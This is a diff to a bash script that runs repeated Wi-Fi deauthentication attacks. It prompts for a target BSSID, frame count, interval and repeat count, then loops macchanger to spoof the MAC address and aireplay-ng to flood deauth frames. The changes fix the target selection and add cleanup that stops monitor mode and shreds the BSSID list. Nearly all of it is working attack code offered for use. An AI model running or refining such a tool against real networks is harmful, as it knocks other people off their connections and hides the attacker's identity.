@@ -31,18 +31,20 @@ echo "Select a BSSID from the list:"
 select bssid in "${bssids[@]}"
 do
   echo "You selected $bssid"
-  bssids+=("$bssid")
+  break
 done
+
+target_bssid="$bssid"
 
 # Sets how many deauth frame will be send in each attack in the loop
 
 echo "How many deauth frames (the default is continous which is not recommended, 100 is recommended) do you want to send out each strike :"
-read -r DEAUTH
+read -r deauth_frames
 
 # sets how many seconds you want to sleep in between each attach
 
 echo "How many seconds do you want to wait in between each strike :"
-read -r SLEEP
+read -r sleep_duration
 
 # Creates a for loop that will execute our commands how many times the user specified.
 echo "Enter the number of times you wish to run the attack? :"
@@ -50,7 +52,11 @@ read -r times
 
 for ((i=1; i<=times; i++))
 do
-	macchanger -r wlan0
-	aireplay-ng --deauth "$DEAUTH" -a "$bssid" wlan0mon
-	sleep "$SLEEP"
+	macchanger -r wlan0mon
+	aireplay-ng --deauth "$deauth_frames" -a "$target_bssid" wlan0mon
+	sleep "$sleep_duration"
 done
+
+# Cleanup and return interface to its original state
+airmon-ng stop wlan0mon
+shred -vfz bssids.txt
